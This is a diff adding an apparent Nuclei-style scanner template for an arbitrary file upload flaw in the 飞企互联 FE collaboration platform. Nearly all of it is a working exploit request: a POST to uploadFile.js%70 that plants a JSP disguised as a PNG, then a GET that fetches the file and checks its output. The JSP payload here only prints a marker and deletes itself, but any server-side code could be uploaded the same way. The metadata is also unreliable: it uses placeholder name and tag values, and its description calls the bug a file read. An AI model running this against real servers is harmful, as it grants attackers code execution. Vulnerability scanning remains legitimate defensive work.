@@ -1,0 +1,41 @@
+id: fe-uploadFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: FE 办公协作平台是实现应用开发、运行、管理、维护的信息管理平台。飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件获取大量敏感信息。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F1-3%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=f1-3%e9%a3%9e%e4%bc%81%e4%ba%92%e8%81%94-fe%e4%bc%81%e4%b8%9a%e8%bf%90%e8%90%a5%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"   
+http:
+  - raw:
+      - |-
+        POST /common/uploadFile.js%70?action=save&savePath=/images/upload/&fileName={{filename}}.jpg&title1=%CE%C4%BC%FE%C9%CF%B4%AB&title2=%D1%A1%D4%F1%CE%C4%BC%FE%A3%BA&allowsize=null&extName=.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: multipart/form-data; boundary=---------------------------289579299639009738743696321529
+        Content-Length: 416
+        Connection: close
+        Cookie: JSESSIONID=F1CA47A72BBC533FE551E29372212913
+        Upgrade-Insecure-Requests: 1
+
+        -----------------------------289579299639009738743696321529
+        Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
+        Content-Type: image/png
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        -----------------------------289579299639009738743696321529--
+      - |+
+        GET /images/upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
